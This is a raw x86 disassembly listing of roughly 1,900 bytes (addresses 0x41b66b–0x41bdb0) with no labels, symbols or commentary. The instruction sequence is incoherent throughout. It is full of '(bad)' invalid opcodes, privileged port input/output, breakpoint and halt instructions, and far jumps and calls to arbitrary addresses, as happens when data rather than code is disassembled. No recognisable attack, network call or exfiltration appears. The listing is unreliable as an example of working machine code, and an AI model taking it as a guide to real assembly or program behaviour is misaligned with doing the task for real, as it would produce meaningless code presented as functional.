  41b66b:	dec    ebp
  41b66c:	test   al,0x31
  41b66e:	inc    DWORD PTR [eax]
  41b670:	cmp    eax,0xad3fed7f
  41b675:	xchg   DWORD PTR [edi+ebx*2-0xf],eax
  41b679:	dec    ebx
  41b67a:	push   edi
  41b67b:	bound  ebx,QWORD PTR [eax]
  41b67d:	mov    eax,0x770145ff
  41b682:	retf   0x304a
  41b685:	mov    al,ds:0xcf6c35ff
  41b68a:	xchg   BYTE PTR [eax],al
  41b68c:	mov    dh,0xdc
  41b68e:	lock sub BYTE PTR [eiz*1+0x1ca6891a],0xf4
  41b697:	imul   ebp,DWORD PTR [ebp+0x19],0xe790bf07
  41b69e:	push   cs
  41b69f:	ror    BYTE PTR ds:0x46437cd2,cl
  41b6a5:	or     al,0x89
  41b6a7:	shr    DWORD PTR [edi+0x13],1
  41b6aa:	add    DWORD PTR [ebx+0x46],0x78553008
  41b6b1:	push   esp
  41b6b2:	ja     0x41b67e
  41b6b4:	retf   0xa4bf
  41b6b7:	call   ebp
  41b6b9:	imul   ebx,esp,0xffffffe8
  41b6bc:	xchg   ecx,eax
  41b6bd:	cmp    DWORD PTR [esp+edi*8-0x7b45],0x62
  41b6c5:	gs inc eax
  41b6c7:	and    al,0x4e
  41b6c9:	or     BYTE PTR [ecx],al
  41b6cb:	in     eax,0x63
  41b6cd:	add    BYTE PTR [ecx-0x11],bh
  41b6d0:	(bad)  [eax+ebp*1+0x594ee71c]
  41b6d7:	jecxz  0x41b6c0
  41b6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6da:	sub    BYTE PTR [eax],bl
  41b6dc:	retf   
  41b6dd:	push   0x58620004
  41b6e2:	adc    ch,bl
  41b6e4:	arpl   WORD PTR [eax],ax
  41b6e6:	jns    0x41b6cf
  41b6e8:	jmp    0xdb55dfa1
  41b6ed:	mov    esp,0xdf001428
  41b6f2:	ins    DWORD PTR es:[edi],dx
  41b6f3:	std    
  41b6f4:	or     DWORD PTR [esi+0x6203e8d9],0x62
  41b6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6fc:	daa    
  41b6fd:	push   0x5a
  41b6ff:	push   edx
  41b700:	adc    al,0x57
  41b702:	pop    ebx
  41b703:	jmp    0x41b707
  41b705:	(bad)  
  41b706:	fldcw  WORD PTR [esi-0x4c]
  41b709:	jmp    0xe9d9:0x1279521b
  41b710:	xchg   ch,ah
  41b712:	fstp   QWORD PTR [ebx-0x2]
  41b715:	sbb    al,0xee
  41b717:	jmp    0xc5f74d26
  41b71c:	push   edi
  41b71d:	inc    esp
  41b71e:	test   BYTE PTR [esi-0x47],bl
  41b721:	std    
  41b722:	push   edx
  41b723:	in     al,0x3
  41b725:	bound  edx,QWORD PTR [ebp+0x2a]
  41b728:	std    
  41b729:	loope  0x41b71c
  41b72b:	jmp    0x9ea41933
  41b730:	daa    
  41b731:	dec    esi
  41b732:	bound  ebx,QWORD PTR [esp+ebx*8]
  41b735:	shl    dh,0xe8
  41b738:	add    ebp,ebx
  41b73a:	test   BYTE PTR ds:0xc21bdaec,al
  41b740:	xor    edi,DWORD PTR [edi+edx*8-0x4ad68717]
  41b747:	fstp   QWORD PTR [eax-0x63]
  41b74a:	fsub   QWORD PTR [edx+edi*4+0x5e]
  41b74e:	push   ebp
  41b74f:	mov    eax,ds:0xc1d96203
  41b754:	add    eax,DWORD PTR [eax]
  41b756:	add    eax,ebx
  41b758:	jmp    0xc5f6d8d7
  41b75d:	xchg   ch,cl
  41b75f:	(bad)  [ebp-0x75]
  41b762:	test   ebp,ebp
  41b764:	jmp    0x1c16a9e7
  41b769:	int    0x50
  41b76b:	popf   
  41b76c:	xlat   BYTE PTR ds:[ebx]
  41b76d:	inc    ebx
  41b76e:	bound  esp,QWORD PTR [edx+0x1]
  41b771:	mov    ds:0xe8ffb389,al
  41b776:	popa   
  41b777:	bound  eax,QWORD PTR [ebp+0xd]
  41b77a:	pop    edx
  41b77b:	bound  ecx,QWORD PTR [ebp+0x5]
  41b77e:	push   edx
  41b77f:	push   esp
  41b780:	inc    eax
  41b781:	add    ebx,ecx
  41b783:	cwde   
  41b784:	and    al,0x5
  41b786:	mov    ecx,0xa27024a1
  41b78b:	mov    ebp,0xd9508be8
  41b790:	add    dl,bh
  41b792:	repz in eax,0x74
  41b795:	add    eax,0xcd45621a
  41b79a:	or     DWORD PTR [eax+ebp*2-0x3],edx
  41b79e:	push   edi
  41b79f:	push   esp
  41b7a0:	inc    eax
  41b7a1:	leave  
  41b7a2:	mov    BYTE PTR [eax+0x24],dh
  41b7a5:	leave  
  41b7a6:	jp     0x41b7a5
  41b7a8:	mov    DWORD PTR [edx-0x56ea11af],ebx
  41b7ae:	rep lods al,BYTE PTR ds:[esi]
  41b7b0:	add    BYTE PTR [eax-0x278a4e66],dh
  41b7b6:	xchg   esi,eax
  41b7b7:	xchg   BYTE PTR [ebx+0x3e],dl
  41b7ba:	add    BYTE PTR [ecx+0x21fbc0c7],ch
  41b7c0:	(bad)  [ecx-0x3ea7a9d6]
  41b7c6:	push   ebp
  41b7c7:	jno    0x41b7b7
  41b7c9:	outs   dx,DWORD PTR ds:[esi]
  41b7ca:	add    DWORD PTR [ecx+0x21dbb0c7],ebp
  41b7d0:	(bad)  [ebp+0x3aa4523a]
  41b7d6:	xor    eax,0xcd45607f
  41b7db:	jne    0x41b766
  41b7dd:	sti    
  41b7de:	xlat   BYTE PTR ds:[ebx]
  41b7df:	cwde   
  41b7e0:	(bad)  
  41b7e1:	cmp    al,0xf8
  41b7e3:	and    ecx,ebx
  41b7e5:	test   DWORD PTR [ecx+0x81c512],ebp
  41b7eb:	pop    edi
  41b7ec:	mov    ecx,0xd87a0324
  41b7f1:	add    BYTE PTR [ecx+eax*4+0x1f],dh
  41b7f5:	push   DWORD PTR ss:[esi]
  41b7f8:	adc    BYTE PTR [ecx],0x40
  41b7fb:	dec    ebx
  41b7fc:	ins    DWORD PTR es:[edi],dx
  41b7fd:	cmp    eax,0x218a6d39
  41b802:	mov    edi,DWORD PTR [eax]
  41b804:	stos   BYTE PTR es:[edi],al
  41b805:	dec    ebx
  41b806:	mov    eax,ebx
  41b808:	imul   edi,edx,0x68a34bff
  41b80e:	out    dx,al
  41b80f:	in     eax,0x95
  41b811:	add    BYTE PTR [eax+0x3b],ch
  41b814:	fmul   DWORD PTR [eax]
  41b816:	add    BYTE PTR [ebx+0x3cff7fdc],ah
  41b81c:	pop    ecx
  41b81d:	mov    esp,0x8e060075
  41b822:	cli    
  41b823:	pop    edi
  41b824:	pusha  
  41b825:	in     eax,dx
  41b826:	xor    bh,bh
  41b828:	les    ecx,FWORD PTR [edx]
  41b82a:	add    DWORD PTR [ebx+0x4c89202c],eax
  41b830:	daa    
  41b831:	hlt    
  41b832:	jecxz  0x41b884
  41b834:	xlat   BYTE PTR ds:[ebx]
  41b835:	aam    0x0
  41b837:	mov    edi,DWORD PTR [esi+0xd]
  41b83a:	inc    ebx
  41b83b:	fs retf 0x89d7
  41b83f:	(bad)  
  41b840:	mov    WORD PTR [edi+0x2c385b57],?
  41b846:	or     al,0xc2
  41b848:	(bad)  
  41b849:	xlat   BYTE PTR ds:[ebx]
  41b84a:	dec    ebx
  41b84b:	push   ebx
  41b84c:	push   esi
  41b84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84e:	push   ebp
  41b84f:	mov    esp,DWORD PTR [edx+0x45047470]
  41b855:	and    BYTE PTR [edi],cl
  41b857:	dec    esp
  41b858:	mov    ecx,0xa0330097
  41b85d:	fcomp  QWORD PTR [ebp+0x24]
  41b860:	ja     0x41b7ed
  41b862:	mov    DWORD PTR [edi+0x62],eax
  41b865:	sbb    al,BYTE PTR [ecx+0x7ddef6bf]
  41b86b:	pop    ebx
  41b86c:	ds adc al,bh
  41b86f:	inc    esp
  41b870:	xor    ah,BYTE PTR [edi+0x3e]
  41b873:	xor    BYTE PTR [ecx],dh
  41b875:	push   eax
  41b876:	iret   
  41b877:	je     0x41b803
  41b879:	ja     0x41b858
  41b87b:	xchg   ch,al
  41b87d:	rcr    BYTE PTR [ebx-0x15],1
  41b880:	pop    esi
  41b881:	call   DWORD PTR [esi+0x2c]
  41b884:	add    BYTE PTR [ebx-0x748c07db],cl
  41b88a:	fwait
  41b88b:	lock pop ds
  41b88d:	push   eax
  41b88e:	inc    eax
  41b88f:	add    BYTE PTR [ecx],ch
  41b891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b892:	call   0xfd13989f
  41b897:	push   DWORD PTR [eax+0x72]
  41b89a:	ja     0x41b8cf
  41b89c:	and    al,0x72
  41b89e:	inc    ecx
  41b89f:	jge    0x41b8ec
  41b8a1:	inc    esi
  41b8a2:	lock or cl,BYTE PTR [ebp+0x3a]
  41b8a6:	dec    esi
  41b8a7:	mov    edi,0x287946e8
  41b8ac:	add    bl,ch
  41b8ae:	xor    eax,0xe88f86fc
  41b8b3:	jp     0x41b8f9
  41b8b5:	xor    dl,BYTE PTR [edi-0x40]
  41b8b8:	adc    al,0x61
  41b8ba:	xor    ebx,DWORD PTR [edx+ebp*2]
  41b8bd:	ins    DWORD PTR es:[edi],dx
  41b8be:	mov    al,0xc9
  41b8c0:	jae    0x41b848
  41b8c2:	loopne 0x41b88d
  41b8c4:	adc    ah,BYTE PTR [esi]
  41b8c6:	jmp    0xb0f9:0x34e1003f
  41b8cd:	arpl   dx,cx
  41b8cf:	leave  
  41b8d0:	adc    ah,BYTE PTR [edx]
  41b8d2:	push   cs
  41b8d3:	inc    eax
  41b8d4:	add    BYTE PTR ds:0xa18a23c2,al
  41b8da:	(bad)  
  41b8db:	daa    
  41b8dc:	ret    0xd95e
  41b8df:	jmp    0x370b3268
  41b8e4:	das    
  41b8e5:	sub    al,0x82
  41b8e7:	pop    esi
  41b8e8:	rol    DWORD PTR [eax],cl
  41b8ea:	xor    ecx,DWORD PTR [esi]
  41b8ec:	mov    ebp,edi
  41b8ee:	push   ebp
  41b8ef:	(bad)  
  41b8f0:	sub    DWORD PTR [ecx+ebx*8],eax
  41b8f3:	imul   esp,ebp,0x30
  41b8f6:	fst    QWORD PTR [ebp+0x6ce4ebcd]
  41b8fc:	lds    esp,FWORD PTR [ebx]
  41b8fe:	push   edi
  41b8ff:	les    esi,FWORD PTR [ebp+0x16d98df5]
  41b905:	xlat   BYTE PTR ds:[ebx]
  41b906:	mov    WORD PTR [ebx+0x1],?
  41b909:	stc    
  41b90a:	out    0x44,eax
  41b90c:	jmp    0x861f:0x9e5e6203
  41b913:	mov    eax,0x5f7e1fcd
  41b918:	mov    dh,0x1f
  41b91a:	dec    edx
  41b91b:	pop    esi
  41b91c:	scas   al,BYTE PTR es:[edi]
  41b91d:	pop    ds
  41b91e:	outs   dx,BYTE PTR ds:[esi]
  41b91f:	push   esi
  41b920:	sub    BYTE PTR [eax],al
  41b922:	push   ebx
  41b923:	and    BYTE PTR [ecx+0x30],dh
  41b926:	shl    DWORD PTR ds:[eax+0x38],1
  41b92a:	inc    esi
  41b92b:	leave  
  41b92c:	pop    esi
  41b92d:	inc    edx
  41b92e:	ds push esi
  41b930:	sub    al,BYTE PTR [eax]
  41b932:	js     0x41b8fa
  41b934:	out    0xc2,al
  41b936:	xchg   ebp,eax
  41b937:	xchg   edx,esi
  41b939:	out    dx,al
  41b93a:	cmp    eax,0xe303a9c3
  41b93f:	adc    al,0xf6
  41b941:	jle    0x41b950
  41b943:	sub    DWORD PTR fs:[ebp+0x17],edi
  41b947:	mov    ebp,0xb58637e6
  41b94c:	gs enter 0x3000,0xdf
  41b951:	jo     0x41b955
  41b953:	in     eax,0x97
  41b955:	in     eax,0x7a
  41b957:	fs loope 0x41b95a
  41b95a:	ret    0x5878
  41b95d:	cmp    ch,cl
  41b95f:	and    eax,0x6eae87e0
  41b964:	jmp    0x1bfb:0xe98e713c
  41b96b:	(bad)  
  41b96c:	in     al,dx
  41b96d:	inc    ecx
  41b96e:	in     eax,0x17
  41b970:	(bad)  
  41b971:	pop    eax
  41b972:	jo     0x41b9cc
  41b974:	mov    ds:0xe10fe541,al
  41b979:	mov    eax,esi
  41b97b:	pop    ecx
  41b97c:	pusha  
  41b97d:	inc    edx
  41b97e:	in     eax,0x36
  41b980:	fnstsw WORD PTR [edi-0x38]
  41b983:	dec    ecx
  41b984:	jmp    0x9508a237
  41b989:	and    al,0xf9
  41b98b:	out    0x9c,al
  41b98d:	and    al,0x5
  41b98f:	cmp    dl,BYTE PTR [edx+0x55]
  41b992:	or     eax,0x287f9c3e
  41b997:	xor    ah,BYTE PTR [eax+0x4d]
  41b99a:	or     eax,0x16aa216
  41b99f:	lods   al,BYTE PTR ds:[esi]
  41b9a0:	push   esp
  41b9a1:	mov    BYTE PTR [ebp+0x1e53c56d],ah
  41b9a7:	hlt    
  41b9a8:	test   al,0xe
  41b9aa:	test   eax,0xac5a8661
  41b9af:	ja     0x41b9ca
  41b9b1:	pop    eax
  41b9b2:	push   0x0
  41b9b4:	lods   eax,DWORD PTR ds:[esi]
  41b9b5:	fdivr  DWORD PTR [esi-0x78739e0f]
  41b9bb:	add    eax,0x6af8fce6
  41b9c0:	lods   eax,DWORD PTR ds:[esi]
  41b9c1:	fmul   DWORD PTR [edi+0x3c]
  41b9c4:	jl     0x41ba18
  41b9c6:	repnz ss dec ecx
  41b9c9:	fidivr WORD PTR [edi-0x5a]
  41b9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9cd:	push   ecx
  41b9ce:	sub    DWORD PTR [ebp+0x5f],0x320000d9
  41b9d5:	cdq    
  41b9d6:	and    al,0x18
  41b9d8:	xor    BYTE PTR [edi-0x46b076c8],ah
  41b9de:	sbb    al,0x57
  41b9e0:	and    ebp,ebx
  41b9e2:	xchg   DWORD PTR [edi+ebx*4-0x44],eax
  41b9e6:	push   eax
  41b9e7:	push   0x79
  41b9e9:	pop    ds
  41b9ea:	(bad)  
  41b9ec:	js     0x41b98a
  41b9ee:	add    BYTE PTR ds:0xdd89,bh
  41b9f4:	outs   dx,DWORD PTR ds:[esi]
  41b9f5:	in     eax,0x80
  41b9f7:	clc    
  41b9f8:	jp     0x41b9e9
  41b9fa:	jle    0x41b98f
  41b9fc:	dec    ebx
  41b9fd:	fadd   QWORD PTR [eax]
  41b9ff:	lea    edx,[ebp-0x18]
  41ba02:	xor    bl,bl
  41ba04:	pop    edx
  41ba05:	mov    cl,0x24
  41ba07:	adc    al,0xe
  41ba09:	pop    ds
  41ba0a:	cmovl  edi,DWORD PTR [ecx]
  41ba0d:	pushf  
  41ba0e:	add    BYTE PTR [ebx-0x3681002b],cl
  41ba14:	out    dx,eax
  41ba15:	mov    ebx,0x5b005689
  41ba1a:	pop    edx
  41ba1b:	shl    BYTE PTR [edx+esi*1+0x4],cl
  41ba1f:	mov    ebp,0x89dc0a62
  41ba24:	fcom   DWORD PTR [eax-0x4076df59]
  41ba2a:	(bad)  
  41ba2b:	adc    al,0x85
  41ba2d:	xor    BYTE PTR [edx-0x4f7440fa],cl
  41ba33:	push   cs
  41ba34:	add    BYTE PTR [eax-0x24],dl
  41ba37:	or     edi,0x15fda8e4
  41ba3d:	or     ebp,edx
  41ba3f:	cmp    eax,DWORD PTR [eax]
  41ba41:	ds xor al,0x70
  41ba44:	fwait
  41ba45:	mov    BYTE PTR [ebp+ecx*8-0x18],ah
  41ba49:	cmp    bl,bl
  41ba4b:	add    BYTE PTR [eax],al
  41ba4d:	bound  esi,QWORD PTR [esi-0x41]
  41ba50:	jae    0x41bacb
  41ba52:	pushf  
  41ba53:	add    al,0x4f
  41ba55:	fldcw  WORD PTR [edi]
  41ba57:	fcom   DWORD PTR [edi-0x7c000d9e]
  41ba5d:	mov    ds:0xefd19a5,al
  41ba62:	fdivrp st(0),st
  41ba64:	mov    BYTE PTR [ebx+eiz*4+0x56],bl
  41ba68:	add    al,0xf8
  41ba6a:	icebp  
  41ba6b:	pop    ecx
  41ba6c:	xor    cl,BYTE PTR [edx+0x75feed9f]
  41ba72:	xchg   esi,eax
  41ba73:	jg     0x41bac1
  41ba75:	push   eax
  41ba76:	repnz mov WORD PTR [edi+0x74],?
  41ba7a:	das    
  41ba7b:	add    BYTE PTR [eax+eax*1-0x8beffde],al
  41ba82:	jmp    0xc04892c2
  41ba87:	icebp  
  41ba88:	jmp    esi
  41ba8a:	scas   al,BYTE PTR es:[edi]
  41ba8b:	xchg   edx,eax
  41ba8d:	cld    
  41ba8e:	std    
  41ba8f:	jo     0x41bac3
  41ba91:	adc    ah,BYTE PTR [edx-0x65]
  41ba94:	fcomp  DWORD PTR [esp+ecx*4+0x3d]
  41ba98:	daa    
  41ba99:	mov    DWORD PTR [edi],edi
  41ba9b:	inc    esi
  41ba9c:	mov    edi,0xd4ae88
  41baa1:	call   0xfd047213
  41baa6:	push   ecx
  41baa7:	mov    al,0xc1
  41baa9:	add    esp,DWORD PTR [edx+0x23]
  41baac:	cs push ebp
  41baae:	jmp    0x5e9e337c
  41bab3:	and    eax,ebx
  41bab5:	adc    bl,BYTE PTR [esi-0x28ffbffe]
  41babb:	outs   dx,DWORD PTR ds:[esi]
  41babc:	sbb    ecx,DWORD PTR [ecx+0x5eb5d86c]
  41bac2:	arpl   ax,si
  41bac4:	jbe    0x41bb12
  41bac6:	jle    0x41baa1
  41bac8:	sar    DWORD PTR [esi+0x59e9d824],1
  41bace:	push   edx
  41bacf:	sub    DWORD PTR [ebx+0x219cb5fe],0x3b54b54f
  41bad9:	call   0x931392b8
  41bade:	cmp    al,0xd8
  41bae0:	jmp    0x81abbb3e
  41bae5:	mov    ds:0x319c8dfe,eax
  41baea:	dec    edi
  41baeb:	lea    ecx,[edx-0x34c21066]
  41baf1:	sub    DWORD PTR [edi+edx*1],eax
  41baf4:	xchg   DWORD PTR [esi],ebp
  41baf6:	shr    esp,0xf4
  41baf9:	dec    ebp
  41bafa:	add    esp,DWORD PTR [edx-0x27]
  41bafd:	push   ss
  41bafe:	das    
  41baff:	mov    ah,0x52
  41bb01:	jns    0x41bb30
  41bb03:	jmp    0x41bae3
  41bb05:	mov    bh,0xa8
  41bb07:	fidiv  DWORD PTR [eax]
  41bb09:	xchg   BYTE PTR [ebx],al
  41bb0b:	(bad)  
  41bb0c:	fldcw  WORD PTR [eax+eax*2-0x7a]
  41bb10:	mov    ebp,0xf12778b9
  41bb15:	or     eax,edi
  41bb17:	cs out 0x6d,al
  41bb1a:	les    esi,FWORD PTR [ecx+0x46306c75]
  41bb20:	jge    0x41bb86
  41bb22:	cmp    BYTE PTR [esi],bh
  41bb24:	mov    cl,0x41
  41bb26:	not    DWORD PTR [edi+0x559e9d8]
  41bb2c:	pop    edx
  41bb2d:	sub    cl,BYTE PTR [edi+0x6c]
  41bb30:	push   esp
  41bb31:	scas   al,BYTE PTR es:[edi]
  41bb32:	pop    ds
  41bb33:	dec    edx
  41bb34:	mov    DWORD PTR [esi-0x4a],ebx
  41bb37:	add    eax,0xe6c50537
  41bb3c:	icebp  
  41bb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb3e:	les    edx,FWORD PTR [ecx-0x43]
  41bb41:	add    ch,al
  41bb43:	dec    esp
  41bb44:	xchg   edx,eax
  41bb45:	and    al,0xd1
  41bb47:	add    BYTE PTR [ecx+0x61e86866],ch
  41bb4d:	mov    ch,BYTE PTR [eax-0x7]
  41bb50:	pop    esi
  41bb51:	fld    DWORD PTR [eax]
  41bb53:	fs jne 0x41bb13
  41bb56:	ins    BYTE PTR es:[edi],dx
  41bb57:	cmp    DWORD PTR ds:0x89e52492,esi
  41bb5d:	sub    DWORD PTR [eax+ebp*8+0x61],0x5d
  41bb62:	sar    DWORD PTR [eiz*2+0x4d5c0173],0xbd
  41bb6a:	sub    BYTE PTR [ecx],bh
  41bb6c:	or     edx,DWORD PTR [ecx+ebp*8]
  41bb6f:	and    BYTE PTR [ebp+0x2d64fbe4],ah
  41bb75:	mov    ebp,0xbd2da610
  41bb7a:	adc    BYTE PTR [ecx-0x3c],bl
  41bb7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb7e:	add    BYTE PTR [ecx-0x16fe9042],dl
  41bb84:	pop    ds
  41bb85:	sbb    al,BYTE PTR [ecx-0x7b989d8e]
  41bb8b:	sbb    ebx,DWORD PTR [esi]
  41bb8d:	xchg   BYTE PTR [edx-0x44],bl
  41bb90:	mov    ah,BYTE PTR [esp+eax*8-0x73]
  41bb94:	pusha  
  41bb95:	fld    DWORD PTR [eax]
  41bb97:	sub    ebp,DWORD PTR [ecx]
  41bb99:	in     eax,0x86
  41bb9b:	test   DWORD PTR [ebp+0x25],eax
  41bb9e:	add    ch,cl
  41bba0:	popa   
  41bba1:	pop    eax
  41bba2:	cld    
  41bba3:	mov    esp,0x5c51880b
  41bba8:	push   ebp
  41bba9:	mov    ebp,0xb0001118
  41bbae:	outs   dx,DWORD PTR ds:[esi]
  41bbaf:	add    ecx,ebp
  41bbb1:	jnp    0x41bbbf
  41bbb3:	test   DWORD PTR [edx],esi
  41bbb5:	out    dx,al
  41bbb6:	pop    eax
  41bbb7:	mov    bl,0xe9
  41bbb9:	popa   
  41bbba:	fldl2t 
  41bbbc:	add    BYTE PTR [eax-0xeffff28],bl
  41bbc2:	xlat   BYTE PTR ds:[ebx]
  41bbc3:	dec    ebx
  41bbc4:	push   ecx
  41bbc5:	hlt    
  41bbc6:	add    BYTE PTR [eax],0x8d
  41bbc9:	das    
  41bbca:	(bad)  
  41bbcb:	les    eax,FWORD PTR [eax]
  41bbcd:	mov    ebx,0xef1ae8d8
  41bbd2:	sbb    ch,bh
  41bbd4:	push   0x6e
  41bbd6:	dec    edx
  41bbd7:	push   eax
  41bbd8:	and    al,0x7b
  41bbda:	xchg   al,ch
  41bbdc:	fdivr  DWORD PTR [ecx+0x478dfd17]
  41bbe2:	icebp  
  41bbe3:	aaa    
  41bbe4:	mov    DWORD PTR [edi],eax
  41bbe6:	icebp  
  41bbe7:	mov    ebx,0x87d87b00
  41bbec:	inc    esp
  41bbed:	xchg   edi,eax
  41bbee:	nop
  41bbef:	push   eax
  41bbf0:	mov    ecx,esp
  41bbf2:	xor    eax,0xd88a6b7a
  41bbf7:	test   al,al
  41bbf9:	push   edi
  41bbfa:	fwait
  41bbfb:	or     eax,0x43f137b7
  41bc00:	dec    eax
  41bc01:	xchg   ebx,eax
  41bc02:	mov    eax,ds:0xc1e382ff
  41bc07:	outs   dx,DWORD PTR ds:[esi]
  41bc08:	pop    es
  41bc09:	or     BYTE PTR [eax],bl
  41bc0b:	mov    di,si
  41bc0e:	sti    
  41bc0f:	dec    ecx
  41bc10:	lea    eax,[eax]
  41bc12:	mov    bh,0xf1
  41bc14:	jnp    0x41bc16
  41bc16:	dec    ebx
  41bc17:	fadd   DWORD PTR [edi-0x176a98b4]
  41bc1d:	add    esp,edi
  41bc1f:	fadd   QWORD PTR [eax]
  41bc21:	test   BYTE PTR [ebx-0x5f],cl
  41bc24:	adc    ecx,DWORD PTR [ebp+0x7bf187]
  41bc2a:	sti    
  41bc2b:	xlat   BYTE PTR ds:[ebx]
  41bc2c:	push   eax
  41bc2d:	lea    esi,[edi-0x71afc405]
  41bc33:	dec    ecx
  41bc34:	and    BYTE PTR [eax-0xd9e],bh
  41bc3a:	cli    
  41bc3b:	pop    ebx
  41bc3c:	ins    BYTE PTR es:[edi],dx
  41bc3d:	cld    
  41bc3e:	in     eax,0x6c
  41bc40:	mov    BYTE PTR [ebx],ah
  41bc42:	adc    dh,dl
  41bc44:	(bad)  
  41bc45:	push   DWORD PTR [edx]
  41bc47:	inc    ebp
  41bc48:	sub    BYTE PTR [eax],dh
  41bc4a:	push   edi
  41bc4b:	repnz dec DWORD PTR [eax+0x244b6cad]
  41bc52:	pop    esi
  41bc53:	or     bl,BYTE PTR [ebx+esi*2+0x63]
  41bc57:	repnz nop
  41bc59:	mov    eax,DWORD PTR [esi+0x62000042]
  41bc5f:	push   0x5671e7d7
  41bc64:	mov    edi,0x90f208fc
  41bc69:	inc    ebx
  41bc6a:	inc    esi
  41bc6b:	ficom  DWORD PTR [ecx+ecx*4-0x6c]
  41bc6f:	dec    ecx
  41bc70:	cmp    al,0xfc
  41bc72:	jge    0x41bcb6
  41bc74:	xchg   ecx,eax
  41bc75:	dec    ebx
  41bc76:	add    BYTE PTR [esi],bh
  41bc78:	loop   0x41bc40
  41bc7a:	inc    ebx
  41bc7b:	inc    esi
  41bc7c:	loop   0x41bc0d
  41bc7e:	mov    ds:0x69a7f222,al
  41bc83:	retf   
  41bc84:	icebp  
  41bc85:	dec    DWORD PTR [ecx-0x2f6a5df]
  41bc8b:	dec    ebp
  41bc8c:	je     0x41bc12
  41bc8e:	jmp    0x41bcf6
  41bc90:	repnz (bad) 
  41bc92:	call   DWORD PTR [ecx-0x16aaa5d3]
  41bc98:	cdq    
  41bc99:	mov    esi,0x3fde8212
  41bc9e:	add    cl,bl
  41bca0:	ins    BYTE PTR es:[edi],dx
  41bca1:	jecxz  0x41bcd6
  41bca3:	lock inc DWORD PTR fs:[esi-0x76e72b62]
  41bcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcac:	lock mov esi,0xe8d9e6af
  41bcb2:	add    esp,DWORD PTR [edx+0x54]
  41bcb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcb6:	out    0x4d,eax
  41bcb8:	jno    0x41bc93
  41bcba:	cmp    BYTE PTR [edx-0x27],ah
  41bcbd:	jg     0x41bcc6
  41bcbf:	xchg   edx,eax
  41bcc0:	icebp  
  41bcc1:	bound  esi,QWORD PTR [ecx]
  41bcc3:	fucom  st(2)
  41bcc5:	gs ret 
  41bcc7:	push   eax
  41bcc8:	fidiv  DWORD PTR [edi-0x161b3b3d]
  41bcce:	add    esp,DWORD PTR [edx+0x4e]
  41bcd1:	sub    eax,0x595e904
  41bcd6:	sbb    al,0x25
  41bcd8:	loop   0x41bc77
  41bcda:	call   0xea1d31df
  41bcdf:	add    ebx,ebx
  41bce1:	push   ecx
  41bce2:	push   0x3
  41bce4:	(bad)  
  41bce5:	fldenv [esi-0x33]
  41bce8:	xchg   esi,eax
  41bce9:	icebp  
  41bcea:	loopne 0x41bc7a
  41bcec:	mov    fs,edx
  41bcee:	les    edx,FWORD PTR gs:[ecx]
  41bcf1:	add    DWORD PTR [edi+0x40],ebp
  41bcf4:	inc    esi
  41bcf5:	lds    ebp,FWORD PTR [esi+0x38]
  41bcf8:	rcr    DWORD PTR ds:[esi-0x27],0xda
  41bcfd:	adc    eax,DWORD PTR [edx-0x1626678b]
  41bd03:	mov    ah,BYTE PTR [ecx+0x1586e1bd]
  41bd09:	shl    BYTE PTR [ebx-0x62],cl
  41bd0c:	dec    ebp
  41bd0d:	loop   0x41bcf8
  41bd0f:	mov    ds,WORD PTR [ecx-0x2253f643]
  41bd15:	adc    al,0xea
  41bd17:	add    ecx,DWORD PTR [ebx-0x47e3f29b]
  41bd1d:	fcomp  DWORD PTR [eax+ecx*4-0x7f]
  41bd21:	ja     0x41bd10
  41bd23:	add    esp,DWORD PTR [edx-0x77]
  41bd26:	outs   dx,BYTE PTR ds:[esi]
  41bd27:	fldl2e 
  41bd29:	adc    al,BYTE PTR [ecx]
  41bd2b:	inc    ecx
  41bd2c:	scas   al,BYTE PTR es:[edi]
  41bd2d:	inc    ebp
  41bd2e:	add    ecx,ebp
  41bd30:	(bad)  
  41bd31:	jmp    0x6d7be3bb
  41bd36:	xchg   esi,esp
  41bd38:	out    dx,al
  41bd39:	jmp    0x41bcc2
  41bd3b:	test   eax,0xc544a04d
  41bd40:	add    BYTE PTR [ebp+0x66],cl
  41bd43:	pop    ecx
  41bd44:	lahf   
  41bd45:	mov    DWORD PTR [ecx],edx
  41bd47:	add    ecx,ebp
  41bd49:	popa   
  41bd4a:	push   eax
  41bd4b:	int3   
  41bd4c:	add    DWORD PTR [edx+ecx*2],eax
  41bd4f:	add    ecx,ebp
  41bd51:	fsub   QWORD PTR [ecx]
  41bd53:	jne    0x41bd41
  41bd55:	mov    eax,0x4f540c71
  41bd5a:	mov    esp,DWORD PTR [esi+0x4d]
  41bd5d:	fist   WORD PTR [ecx+ebp*8]
  41bd60:	sahf   
  41bd61:	leave  
  41bd62:	loope  0x41bd5f
  41bd64:	ins    BYTE PTR es:[edi],dx
  41bd65:	mov    eax,ds:0x4e001165
  41bd6a:	aad    0x74
  41bd6c:	in     eax,0x2a
  41bd6e:	push   eax
  41bd6f:	into   
  41bd70:	shl    DWORD PTR [ebx-0x16],0xfb
  41bd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd75:	out    dx,al
  41bd76:	or     eax,ebp
  41bd78:	(bad)
  41bd7b:	jmp    0xfc266a51
  41bd80:	aaa    
  41bd81:	outs   dx,DWORD PTR ds:[esi]
  41bd82:	pop    es
  41bd83:	mov    edx,0xd96160
  41bd88:	xchg   ecx,eax
  41bd89:	mov    ds:0xabe90206,eax
  41bd8e:	stos   BYTE PTR es:[edi],al
  41bd8f:	into   
  41bd90:	xor    cl,ch
  41bd92:	loopne 0x41bd8f
  41bd94:	jmp    0xe9152da2
  41bd99:	popa   
  41bd9a:	stos   BYTE PTR es:[edi],al
  41bd9b:	xlat   BYTE PTR ds:[ebx]
  41bd9c:	stos   BYTE PTR es:[edi],al
  41bd9d:	fmulp  st(5),st
  41bd9f:	call   0xfc2280f6
  41bda4:	add    BYTE PTR [eax],al
  41bda6:	nop
  41bda7:	or     esp,esp
  41bda9:	hlt    
  41bdaa:	cmc    
  41bdab:	fild   DWORD PTR [eax]
  41bdad:	mov    eax,DWORD PTR [ebp+0x34]
  41bdb0:	out    0x5e,eax
